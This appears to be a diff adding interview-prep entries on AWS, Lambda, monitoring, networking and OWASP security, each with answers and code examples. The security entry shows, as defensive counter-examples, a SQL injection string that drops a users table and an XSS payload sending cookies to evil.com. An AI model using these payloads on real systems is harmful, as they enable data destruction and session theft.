+          "code": "# Deploy a React app to S3 + CloudFront\n\n# 1. Create S3 bucket for static hosting\naws s3 mb s3://myapp-frontend\naws s3 website s3://myapp-frontend \\\n  --index-document index.html \\\n  --error-document index.html\n\n# 2. Build and upload React app\nnpm run build\naws s3 sync dist/ s3://myapp-frontend --delete\n\n# 3. CloudFront distribution (CDN)\n# Creates edge locations worldwide for fast loading\naws cloudfront create-distribution \\\n  --origin-domain-name myapp-frontend.s3.amazonaws.com \\\n  --default-root-object index.html\n\n# 4. Invalidate CDN cache after deploy\naws cloudfront create-invalidation \\\n  --distribution-id E1234567890 \\\n  --paths \"/*\"\n\n# S3 bucket policy for public read\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Principal\": \"*\",\n    \"Action\": \"s3:GetObject\",\n    \"Resource\": \"arn:aws:s3:::myapp-frontend/*\"\n  }]\n}\n\n# Cost: ~$1-5/month for a typical SPA\n# S3 storage + CloudFront bandwidth",
+          "explanation": "S3 + CloudFront is the cheapest and fastest way to host a static React app. CloudFront caches assets at edge locations close to users worldwide."
+        },
+        {
+          "title": "IAM Roles and Policies",
+          "code": "# IAM Policy: Least privilege access\n# Only allow specific S3 actions on specific bucket\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:PutObject\",\n        \"s3:DeleteObject\"\n      ],\n      \"Resource\": \"arn:aws:s3:::my-uploads-bucket/*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:ListBucket\",\n      \"Resource\": \"arn:aws:s3:::my-uploads-bucket\"\n    }\n  ]\n}\n\n# Create IAM user for CI/CD\naws iam create-user --user-name github-actions\naws iam attach-user-policy --user-name github-actions \\\n  --policy-arn arn:aws:iam::123456789:policy/deploy-policy\naws iam create-access-key --user-name github-actions\n\n# Better: Use IAM Roles with OIDC for GitHub Actions\n# No long-lived credentials needed\n# GitHub Actions assumes an IAM role via OIDC token\n\n# Check who you are\naws sts get-caller-identity\n# {\"UserId\": \"AIDA...\", \"Account\": \"123456789\", \"Arn\": \"arn:aws:iam::...\"}\n\n# List attached policies\naws iam list-attached-user-policies --user-name github-actions",
+          "explanation": "Always follow least-privilege: grant only the permissions needed. Use IAM roles with OIDC for CI/CD instead of long-lived access keys. Avoid using the root account."
+        }
+      ],
+      "notes": [
+        "Follow the principle of least privilege for IAM: only grant permissions that are needed",
+        "S3 + CloudFront is the standard way to deploy static frontends on AWS",
+        "Use managed services (RDS, ElastiCache) instead of running databases on EC2"
+      ],
+      "followUps": [
+        "What is the difference between EC2, ECS, and Lambda?",
+        "How do you estimate AWS costs for a web application?",
+        "What is the shared responsibility model in cloud computing?"
+      ],
+      "interviewTips": [
+        "Know the core services and how they connect in a typical web app architecture",
+        "Mention IAM and least-privilege - it shows security awareness",
+        "Be honest about which services you have actually used vs just studied"
+      ]
+    }
+  },
+  {
+    "id": "devops-serverless",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 26,
+    "title": "Serverless (Lambda, Functions)",
+    "difficulty": "Intermediate",
+    "type": "Concept",
+    "concepts": ["Serverless", "AWS Lambda", "API Gateway", "Cold Start", "Event-Driven", "FaaS"],
+    "content": {
+      "question": "What is serverless computing? Explain AWS Lambda, its advantages and limitations, and when to use it.",
+      "answer": "Serverless computing lets you run code without provisioning or managing servers. The cloud provider handles all infrastructure: scaling, patching, availability. You pay only for actual compute time, not idle servers.\n\nAWS Lambda is the most popular serverless platform. You upload a function, define a trigger (HTTP request, S3 upload, scheduled event, queue message), and Lambda runs your code when triggered. It scales automatically from zero to thousands of concurrent executions.\n\nAdvantages:\n- Zero server management and patching\n- Automatic scaling (including to zero when idle)\n- Pay-per-use billing (per 1ms of execution)\n- Built-in high availability across multiple zones\n\nLimitations:\n- Cold starts: first invocation after idle period is slower (100ms-2s)\n- Execution timeout: maximum 15 minutes per invocation\n- Stateless: no local state between invocations\n- Vendor lock-in: code depends on cloud provider APIs\n- Debugging is harder than traditional servers\n\nIdeal for: APIs with variable traffic, event processing (image resizing, email sending), scheduled tasks (cron jobs), and webhooks. Not ideal for: long-running processes, WebSocket connections, or applications with consistent high traffic (cheaper to run a server).",
+      "codeExamples": [
+        {
+          "title": "AWS Lambda Function",
+          "code": "// handler.ts - AWS Lambda function\nimport { APIGatewayProxyEvent, APIGatewayProxyResult } from 'aws-lambda';\n\nexport const handler = async (\n  event: APIGatewayProxyEvent\n): Promise<APIGatewayProxyResult> => {\n  try {\n    const body = JSON.parse(event.body || '{}');\n    const { name } = body;\n\n    // Your business logic here\n    const result = await processRequest(name);\n\n    return {\n      statusCode: 200,\n      headers: {\n        'Content-Type': 'application/json',\n        'Access-Control-Allow-Origin': '*',\n      },\n      body: JSON.stringify({ message: `Hello, ${name}!`, data: result }),\n    };\n  } catch (error) {\n    console.error('Error:', error);\n    return {\n      statusCode: 500,\n      body: JSON.stringify({ error: 'Internal server error' }),\n    };\n  }\n};\n\n// S3 trigger example - resize uploaded images\nexport const imageResizer = async (event: S3Event) => {\n  for (const record of event.Records) {\n    const bucket = record.s3.bucket.name;\n    const key = record.s3.object.key;\n    // Download image, resize, upload thumbnail\n    await resizeImage(bucket, key);\n  }\n};",
+          "explanation": "Lambda functions receive an event object and return a response. API Gateway events include HTTP method, headers, body, and path parameters. S3 events trigger on file uploads."
+        },
+        {
+          "title": "Serverless Framework Deployment",
+          "code": "# serverless.yml - Infrastructure as Code\nservice: myapp-api\n\nprovider:\n  name: aws\n  runtime: nodejs20.x\n  region: us-east-1\n  memorySize: 256\n  timeout: 10\n  environment:\n    DATABASE_URL: ${ssm:/myapp/prod/database-url}\n    JWT_SECRET: ${ssm:/myapp/prod/jwt-secret}\n\nfunctions:\n  getUsers:\n    handler: src/handlers/users.getAll\n    events:\n      - http:\n          path: /api/users\n          method: get\n          cors: true\n\n  createUser:\n    handler: src/handlers/users.create\n    events:\n      - http:\n          path: /api/users\n          method: post\n          cors: true\n\n  processImage:\n    handler: src/handlers/images.resize\n    events:\n      - s3:\n          bucket: my-uploads\n          event: s3:ObjectCreated:*\n          rules:\n            - suffix: .jpg\n\n  dailyReport:\n    handler: src/handlers/reports.generate\n    events:\n      - schedule: cron(0 9 * * ? *)  # 9 AM daily\n\n# Deploy\n# npx serverless deploy\n# npx serverless deploy --stage production",
+          "explanation": "The Serverless Framework defines Lambda functions, their triggers, and infrastructure in YAML. One command deploys everything: functions, API Gateway, S3 triggers, and scheduled events."
+        },
+        {
+          "title": "Cold Start Mitigation",
+          "code": "// Cold start happens when Lambda creates a new execution environment\n// Strategies to minimize impact:\n\n// 1. Keep functions warm with scheduled pings\n// serverless.yml:\n// functions:\n//   api:\n//     handler: handler.main\n//     events:\n//       - schedule: rate(5 minutes)  # ping every 5 min\n\n// 2. Minimize bundle size (faster initialization)\n// Use esbuild or webpack to tree-shake\n// Avoid large SDKs - import only what you need:\nimport { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';\n// NOT: import AWS from 'aws-sdk';  // imports everything\n\n// 3. Initialize outside the handler (reused between invocations)\nimport { PrismaClient } from '@prisma/client';\n\n// This runs ONCE when the container starts (cold start)\nconst prisma = new PrismaClient();\n\n// This runs on EVERY invocation (reuses the connection)\nexport const handler = async (event: APIGatewayProxyEvent) => {\n  const users = await prisma.user.findMany();\n  return { statusCode: 200, body: JSON.stringify(users) };\n};\n\n// 4. Provisioned Concurrency (costs money but eliminates cold starts)\n// aws lambda put-provisioned-concurrency-config \\\n//   --function-name myFunction \\\n//   --qualifier prod \\\n//   --provisioned-concurrent-executions 5\n\n// Cold start times (approximate):\n// Node.js:  ~200-500ms\n// Python:   ~200-500ms\n// Java:     ~3-10 seconds\n// Go/Rust:  ~50-100ms",
+          "explanation": "Initialize expensive resources (DB connections, SDK clients) outside the handler so they persist between invocations. Use the v3 AWS SDK for smaller bundles. Provisioned Concurrency eliminates cold starts."
+        }
+      ],
+      "notes": [
+        "Initialize database connections and SDK clients outside the handler for reuse between invocations",
+        "Lambda has a 15-minute execution timeout and 10GB memory limit",
+        "Cold starts affect first invocations - use warming strategies for latency-sensitive APIs"
+      ],
+      "followUps": [
+        "When would you choose serverless over a traditional server?",
+        "How do you handle database connections in serverless functions?",
+        "What is the difference between AWS Lambda and AWS Fargate?"
+      ],
+      "interviewTips": [
+        "Know when serverless is and is not appropriate - do not present it as a silver bullet",
+        "Explain cold starts and mitigation strategies to show practical experience",
+        "Mention event-driven use cases like image processing and webhooks"
+      ]
+    }
+  },
+  {
+    "id": "devops-monitoring",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 27,
+    "title": "Monitoring & Alerting",
+    "difficulty": "Intermediate",
+    "type": "Concept",
+    "concepts": ["Monitoring", "Logging", "Metrics", "Alerting", "Observability", "APM"],
+    "content": {
+      "question": "How do you monitor applications in production? Explain the three pillars of observability and how to set up effective alerting.",
+      "answer": "Monitoring tells you when something is broken. Observability tells you why. The three pillars of observability are logs, metrics, and traces.\n\nLogs record discrete events with context. Structured JSON logs are searchable and parsable. Centralize logs from all services into one platform (ELK Stack, Datadog, CloudWatch) for correlation.\n\nMetrics are numeric measurements over time: request rate, error rate, latency percentiles, CPU/memory usage. They answer 'how much' and 'how fast.' The RED method (Rate, Errors, Duration) covers the essentials for any service.\n\nTraces follow a single request through multiple services. Essential for debugging microservices where a request might touch 5-10 services. Each span records timing and metadata.\n\nAlerting rules turn metrics into notifications. Good alerts are actionable (someone can fix it), relevant (not noise), and tiered (warning vs critical). Alert on symptoms (high error rate) not causes (high CPU) because symptoms directly impact users.\n\nKey metrics to monitor:\n- The Four Golden Signals: latency, traffic, errors, saturation\n- Business metrics: signups, orders, payments\n- Infrastructure: CPU, memory, disk, network",
+      "codeExamples": [
+        {
+          "title": "Structured Logging",
+          "code": "// Winston structured logging setup\nimport winston from 'winston';\n\nconst logger = winston.createLogger({\n  level: process.env.LOG_LEVEL || 'info',\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.errors({ stack: true }),\n    winston.format.json()\n  ),\n  defaultMeta: { service: 'api-server' },\n  transports: [\n    new winston.transports.Console(),\n    new winston.transports.File({ filename: 'error.log', level: 'error' }),\n  ],\n});\n\n// Structured log output (easy to search and parse)\nlogger.info('User logged in', {\n  userId: 123,\n  email: 'john@example.com',\n  ip: '192.168.1.1',\n  method: 'password',\n  duration: 45,\n});\n// {\"level\":\"info\",\"message\":\"User logged in\",\"userId\":123,...,\"timestamp\":\"2024-01-15T10:00:00Z\"}\n\nlogger.error('Payment processing failed', {\n  orderId: 456,\n  amount: 99.99,\n  error: err.message,\n  stack: err.stack,\n  provider: 'razorpay',\n});\n\n// Request logging middleware\napp.use((req, res, next) => {\n  const start = Date.now();\n  res.on('finish', () => {\n    logger.info('HTTP Request', {\n      method: req.method,\n      path: req.path,\n      status: res.statusCode,\n      duration: Date.now() - start,\n      userAgent: req.headers['user-agent'],\n    });\n  });\n  next();\n});",
+          "explanation": "Structured JSON logs are machine-parseable and searchable. Always include context (userId, orderId) so you can correlate events. Log at appropriate levels: error for failures, info for events, debug for troubleshooting."
+        },
+        {
+          "title": "Prometheus Metrics and Grafana",
+          "code": "// Express metrics with prom-client\nimport promClient from 'prom-client';\n\n// Collect default metrics (CPU, memory, event loop)\npromClient.collectDefaultMetrics();\n\n// Custom metrics\nconst httpRequestDuration = new promClient.Histogram({\n  name: 'http_request_duration_seconds',\n  help: 'Duration of HTTP requests in seconds',\n  labelNames: ['method', 'route', 'status'],\n  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5],\n});\n\nconst httpRequestTotal = new promClient.Counter({\n  name: 'http_requests_total',\n  help: 'Total number of HTTP requests',\n  labelNames: ['method', 'route', 'status'],\n});\n\n// Middleware to record metrics\napp.use((req, res, next) => {\n  const end = httpRequestDuration.startTimer();\n  res.on('finish', () => {\n    const route = req.route?.path || req.path;\n    end({ method: req.method, route, status: res.statusCode });\n    httpRequestTotal.inc({ method: req.method, route, status: res.statusCode });\n  });\n  next();\n});\n\n// Expose metrics endpoint for Prometheus scraping\napp.get('/metrics', async (req, res) => {\n  res.set('Content-Type', promClient.register.contentType);\n  res.end(await promClient.register.metrics());\n});\n\n// Prometheus scrapes /metrics every 15s\n// Grafana visualizes the data in dashboards\n// Alert rules fire when thresholds are exceeded",
+          "explanation": "Prometheus collects time-series metrics. Histograms track latency distributions (p50, p95, p99). Counters track totals. Grafana creates dashboards and Alertmanager sends notifications."
+        },
+        {
+          "title": "Health Checks and Alerting Rules",
+          "code": "// Health check endpoint with dependency checks\napp.get('/health', async (req, res) => {\n  const checks = {\n    uptime: process.uptime(),\n    timestamp: Date.now(),\n    database: 'unknown',\n    cache: 'unknown',\n  };\n\n  try {\n    await prisma.$queryRaw`SELECT 1`;\n    checks.database = 'healthy';\n  } catch {\n    checks.database = 'unhealthy';\n  }\n\n  try {\n    await redis.ping();\n    checks.cache = 'healthy';\n  } catch {\n    checks.cache = 'unhealthy';\n  }\n\n  const isHealthy = checks.database === 'healthy' && checks.cache === 'healthy';\n  res.status(isHealthy ? 200 : 503).json(checks);\n});\n\n// Alerting rules (Prometheus/Alertmanager format)\n// groups:\n//   - name: app-alerts\n//     rules:\n//       - alert: HighErrorRate\n//         expr: rate(http_requests_total{status=~\"5..\"}[5m])\n//               / rate(http_requests_total[5m]) > 0.05\n//         for: 2m\n//         labels:\n//           severity: critical\n//         annotations:\n//           summary: \"Error rate above 5% for 2 minutes\"\n//\n//       - alert: HighLatency\n//         expr: histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])) > 2\n//         for: 5m\n//         labels:\n//           severity: warning\n//         annotations:\n//           summary: \"p99 latency above 2 seconds\"\n//\n//       - alert: HealthCheckFailing\n//         expr: probe_success{job=\"health-check\"} == 0\n//         for: 1m\n//         labels:\n//           severity: critical",
+          "explanation": "Health checks report status of all dependencies. Alert on error rate and latency (symptoms), not CPU (causes). Use 'for' durations to avoid false alarms from brief spikes."
+        }
+      ],
+      "notes": [
+        "Alert on symptoms (error rate, latency) not causes (CPU, memory)",
+        "The RED method (Rate, Errors, Duration) covers essential metrics for any service",
+        "Structured JSON logs are searchable and parseable by log aggregation tools"
+      ],
+      "followUps": [
+        "What is the difference between monitoring and observability?",
+        "How do you avoid alert fatigue?",
+        "What is distributed tracing and when do you need it?"
+      ],
+      "interviewTips": [
+        "Know the three pillars of observability: logs, metrics, traces",
+        "Mention specific tools you have used: Prometheus, Grafana, Datadog, ELK",
+        "Explain the difference between alerting on symptoms vs causes"
+      ]
+    }
+  },
+  {
+    "id": "devops-networking",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 28,
+    "title": "Networking (DNS, HTTP, TCP)",
+    "difficulty": "Intermediate",
+    "type": "Theory",
+    "concepts": ["DNS", "HTTP/HTTPS", "TCP/IP", "TLS", "CORS", "WebSockets"],
+    "content": {
+      "question": "Explain what happens when you type a URL in the browser. Cover DNS, TCP, TLS, and HTTP.",
+      "answer": "When you type https://example.com/api/users and press Enter, a remarkable chain of events happens:\n\n1. DNS Resolution: The browser needs an IP address. It checks its cache, then the OS cache, then queries DNS resolvers. The resolver walks the DNS hierarchy: root nameserver -> .com nameserver -> example.com authoritative nameserver. Returns the IP (e.g., 93.184.216.34).\n\n2. TCP Connection: The browser initiates a TCP three-way handshake with the server: SYN -> SYN-ACK -> ACK. This establishes a reliable, ordered connection.\n\n3. TLS Handshake: For HTTPS, a TLS handshake follows. Client and server agree on encryption algorithms, the server presents its certificate (proving identity), and they exchange keys to establish an encrypted channel. This adds 1-2 round trips.\n\n4. HTTP Request: The browser sends an HTTP GET request with headers (Host, User-Agent, Accept, cookies, etc.).\n\n5. Server Processing: The server processes the request (routing, middleware, business logic, database queries) and builds a response.\n\n6. HTTP Response: The server sends back a status code (200 OK), headers (Content-Type, Cache-Control, Set-Cookie), and the response body (HTML, JSON, etc.).\n\n7. Rendering: For HTML, the browser parses the DOM, fetches CSS/JS/images, and renders the page.\n\nThis entire process typically takes 100-500ms.",
+      "codeExamples": [
+        {
+          "title": "DNS and Network Debugging",
+          "code": "# DNS lookup\nnslookup example.com\n# Address: 93.184.216.34\n\ndig example.com\n# ANSWER SECTION:\n# example.com.  3600  IN  A  93.184.216.34\n\n# DNS record types:\n# A     - Maps domain to IPv4 address\n# AAAA  - Maps domain to IPv6 address\n# CNAME - Alias to another domain\n# MX    - Mail server\n# TXT   - Text records (SPF, DKIM, domain verification)\n# NS    - Nameserver\n\n# Trace the route to a server\ntraceroute example.com\n# Shows each hop (router) between you and the server\n\n# Check if a port is open\nnc -zv example.com 443\n# Connection to example.com 443 port [tcp/https] succeeded!\n\n# Full HTTP request/response details\ncurl -v https://example.com\n# Shows DNS, TCP, TLS, HTTP headers in detail\n\n# Check SSL certificate\nopenssl s_client -connect example.com:443 -servername example.com\n# Shows certificate chain, expiry date, cipher suite\n\n# Test HTTP response time\ncurl -o /dev/null -s -w \"DNS: %{time_namelookup}s\\nTCP: %{time_connect}s\\nTLS: %{time_appconnect}s\\nTotal: %{time_total}s\\n\" https://example.com",
+          "explanation": "curl -v is the most useful debugging tool for HTTP issues. It shows every step: DNS, TCP, TLS, request headers, response headers. dig shows detailed DNS information."
+        },
+        {
+          "title": "HTTP Headers and Status Codes",
+          "code": "# Common HTTP Status Codes:\n# 200 OK              - Success\n# 201 Created         - Resource created (POST)\n# 204 No Content      - Success, no body (DELETE)\n# 301 Moved Permanently - Permanent redirect (SEO)\n# 302 Found           - Temporary redirect\n# 304 Not Modified    - Use cached version\n# 400 Bad Request     - Invalid client input\n# 401 Unauthorized    - Not authenticated\n# 403 Forbidden       - Authenticated but not authorized\n# 404 Not Found       - Resource does not exist\n# 409 Conflict        - Resource conflict (duplicate)\n# 429 Too Many Requests - Rate limited\n# 500 Internal Server Error - Server bug\n# 502 Bad Gateway     - Upstream server error\n# 503 Service Unavailable - Server overloaded/down\n\n# Important Response Headers:\n# Cache-Control: max-age=3600, public\n# Content-Type: application/json; charset=utf-8\n# X-RateLimit-Remaining: 95\n# Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n\n# Important Request Headers:\n# Authorization: Bearer <jwt-token>\n# Content-Type: application/json\n# Accept: application/json\n# Origin: https://myapp.com (CORS)\n\n# CORS Headers (server response):\n# Access-Control-Allow-Origin: https://myapp.com\n# Access-Control-Allow-Methods: GET, POST, PUT, DELETE\n# Access-Control-Allow-Headers: Content-Type, Authorization\n# Access-Control-Allow-Credentials: true",
+          "explanation": "Know status codes by heart - they communicate intent. Cache-Control headers dramatically improve performance. CORS headers control which domains can access your API."
+        },
+        {
+          "title": "CORS and WebSockets",
+          "code": "// CORS (Cross-Origin Resource Sharing)\n// Browser blocks requests from different origins by default\n// Server must explicitly allow cross-origin access\n\nimport cors from 'cors';\n\napp.use(cors({\n  origin: ['https://myapp.com', 'http://localhost:5173'],\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  credentials: true,  // allow cookies\n}));\n\n// Preflight request: browser sends OPTIONS before POST/PUT/DELETE\n// Server must respond with appropriate CORS headers\n// GET and POST with simple headers skip preflight\n\n// WebSocket: full-duplex communication\n// HTTP: request-response (client initiates)\n// WebSocket: bidirectional (both can send anytime)\n\nimport { WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  console.log('Client connected');\n\n  ws.on('message', (data) => {\n    // Broadcast to all connected clients\n    wss.clients.forEach((client) => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(data.toString());\n      }\n    });\n  });\n\n  ws.on('close', () => console.log('Client disconnected'));\n});\n\n// Use cases for WebSockets:\n// - Real-time chat\n// - Live notifications\n// - Collaborative editing\n// - Live dashboards\n// - Multiplayer games",
+          "explanation": "CORS is a browser security feature, not a server limitation. Preflight OPTIONS requests check permissions before the actual request. WebSockets maintain a persistent connection for real-time bidirectional communication."
+        }
+      ],
+      "notes": [
+        "DNS resolution is often the slowest part of the first request to a new domain",
+        "CORS is enforced by the browser, not the server - Postman/curl bypass CORS entirely",
+        "HTTPS adds 1-2 round trips for TLS handshake but is mandatory for security"
+      ],
+      "followUps": [
+        "What is the difference between HTTP/1.1, HTTP/2, and HTTP/3?",
+        "How does a CDN reduce latency?",
+        "What is the difference between TCP and UDP?"
+      ],
+      "interviewTips": [
+        "Walk through the full URL-to-render flow confidently - it is a classic interview question",
+        "Know HTTP status codes by heart, especially 401 vs 403 and 502 vs 503",
+        "Explain CORS clearly - it is misunderstood even by experienced developers"
+      ]
+    }
+  },
+  {
+    "id": "devops-security",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 29,
+    "title": "Security Best Practices (OWASP)",
+    "difficulty": "Intermediate",
+    "type": "Concept",
+    "concepts": ["OWASP Top 10", "XSS", "SQL Injection", "CSRF", "Authentication", "HTTPS", "Input Validation"],
+    "content": {
+      "question": "What are the OWASP Top 10 vulnerabilities? How do you secure a web application against common attacks?",
+      "answer": "The OWASP Top 10 is the most authoritative list of critical web application security risks. Every developer should understand and mitigate these:\n\n1. Broken Access Control: Users accessing resources they should not. Fix: check authorization on every endpoint, deny by default.\n2. Cryptographic Failures: Sensitive data exposed due to weak or missing encryption. Fix: HTTPS everywhere, hash passwords with bcrypt, encrypt data at rest.\n3. Injection: SQL injection, NoSQL injection, command injection. Fix: parameterized queries, input validation, never concatenate user input into queries.\n4. Insecure Design: Flawed architecture that cannot be fixed by implementation. Fix: threat modeling, security by design, defense in depth.\n5. Security Misconfiguration: Default credentials, unnecessary features enabled, verbose errors. Fix: harden configurations, disable debug in production.\n6. Vulnerable Components: Using libraries with known vulnerabilities. Fix: npm audit, Dependabot, regular updates.\n7. Authentication Failures: Weak passwords, missing MFA, session issues. Fix: strong password policies, MFA, secure session management.\n8. Data Integrity Failures: Trusting unverified data (unsigned updates, insecure deserialization). Fix: verify signatures, validate all inputs.\n9. Logging Failures: Not logging security events or logging sensitive data. Fix: log auth failures, access control failures; never log passwords or tokens.\n10. SSRF: Server-side request forgery, making the server fetch attacker-controlled URLs. Fix: validate and whitelist URLs, block internal network access.",
+      "codeExamples": [
+        {
+          "title": "Preventing Injection Attacks",
+          "code": "// SQL Injection - the #1 most dangerous vulnerability\n\n// BAD: String concatenation (vulnerable!)\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n// Attacker input: ' OR 1=1; DROP TABLE users; --\n// Executes: SELECT * FROM users WHERE email = '' OR 1=1; DROP TABLE users; --'\n\n// GOOD: Parameterized queries (safe)\nconst user = await prisma.user.findUnique({\n  where: { email: email },\n});\n// Prisma automatically parameterizes queries\n\n// GOOD: Raw query with parameters\nconst users = await prisma.$queryRaw`\n  SELECT * FROM users WHERE email = ${email}\n`;\n// Template literal is parameterized by Prisma, NOT concatenated\n\n// XSS (Cross-Site Scripting)\n// BAD: Inserting user input into HTML\nres.send(`<h1>Welcome, ${username}</h1>`);\n// Attacker input: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\n\n// GOOD: Use a template engine that escapes by default\n// React escapes JSX by default:\n// <h1>Welcome, {username}</h1>  // Safe - React escapes HTML\n\n// GOOD: Sanitize HTML if you must render it\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput);",
+          "explanation": "Never concatenate user input into queries or HTML. Use parameterized queries (Prisma does this automatically). React escapes JSX by default, preventing most XSS. Use DOMPurify if you must render user HTML."
+        },
+        {
+          "title": "Authentication and Session Security",
+          "code": "// Password hashing with bcrypt\nimport bcrypt from 'bcrypt';\n\nconst SALT_ROUNDS = 12;\n\n// Hash password before storing\nconst hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);\n// Store hashedPassword in database\n\n// Verify password on login\nconst isValid = await bcrypt.compare(inputPassword, hashedPassword);\n\n// JWT best practices\nimport jwt from 'jsonwebtoken';\n\nconst token = jwt.sign(\n  { userId: user.id, role: user.role },\n  process.env.JWT_SECRET,\n  {\n    expiresIn: '24h',  // short expiry\n    issuer: 'myapp',\n    audience: 'myapp-client',\n  }\n);\n\n// Secure cookie settings\nres.cookie('token', token, {\n  httpOnly: true,    // not accessible via JavaScript\n  secure: true,      // HTTPS only\n  sameSite: 'strict', // prevent CSRF\n  maxAge: 24 * 60 * 60 * 1000, // 24 hours\n  path: '/',\n});\n\n// Security headers middleware\nimport helmet from 'helmet';\napp.use(helmet());\n// Sets: X-Content-Type-Options, X-Frame-Options,\n// Strict-Transport-Security, X-XSS-Protection, etc.\n\n// Rate limiting\nimport rateLimit from 'express-rate-limit';\napp.use('/api/auth', rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 10,                   // 10 attempts per window\n  message: 'Too many login attempts, try again later',\n}));",
+          "explanation": "Bcrypt with 12+ salt rounds makes brute-forcing impractical. HttpOnly cookies prevent XSS from stealing tokens. Helmet sets security headers automatically. Rate limiting prevents brute-force attacks."
+        },
+        {
+          "title": "Input Validation with Zod",
+          "code": "// Validate ALL user input on the server\nimport { z } from 'zod';\n\nconst createUserSchema = z.object({\n  email: z.string().email().max(255).toLowerCase(),\n  password: z.string()\n    .min(8, 'Password must be at least 8 characters')\n    .max(128)\n    .regex(/[A-Z]/, 'Must contain uppercase letter')\n    .regex(/[0-9]/, 'Must contain a number'),\n  name: z.string().min(1).max(100).trim(),\n  role: z.enum(['STUDENT', 'RECRUITER']),\n});\n\n// Middleware for validation\nconst validate = (schema: z.ZodSchema) => (req, res, next) => {\n  try {\n    req.body = schema.parse(req.body);\n    next();\n  } catch (error) {\n    if (error instanceof z.ZodError) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        details: error.errors.map(e => ({\n          field: e.path.join('.'),\n          message: e.message,\n        })),\n      });\n    }\n    next(error);\n  }\n};\n\n// Use in routes\napp.post('/api/auth/register',\n  validate(createUserSchema),\n  authController.register\n);\n\n// NEVER trust client-side validation alone\n// Client validation = UX (immediate feedback)\n// Server validation = SECURITY (actual enforcement)\n\n// npm audit - check for vulnerable dependencies\n// npm audit\n// npm audit fix\n// Run regularly and in CI/CD pipeline",
+          "explanation": "Zod validates and transforms input at the server boundary. Never trust client-side validation for security. Run npm audit in CI/CD to catch vulnerable dependencies automatically."
+        }
+      ],
+      "notes": [
+        "Never trust user input - validate and sanitize everything on the server",
+        "Use parameterized queries to prevent SQL injection - Prisma does this automatically",
+        "Run npm audit regularly and in CI/CD to catch vulnerable dependencies"
+      ],
+      "followUps": [
+        "What is the difference between authentication and authorization?",
+        "How do you handle CSRF in a single-page application?",
+        "What is Content Security Policy and how does it prevent XSS?"
+      ],
+      "interviewTips": [
+        "Know the OWASP Top 10 by name - it is the standard security knowledge baseline",
+        "Give concrete examples of preventing injection and XSS in code",
+        "Mention helmet, bcrypt, and rate limiting as practical tools you use"
+      ]
+    }
+  }
+]
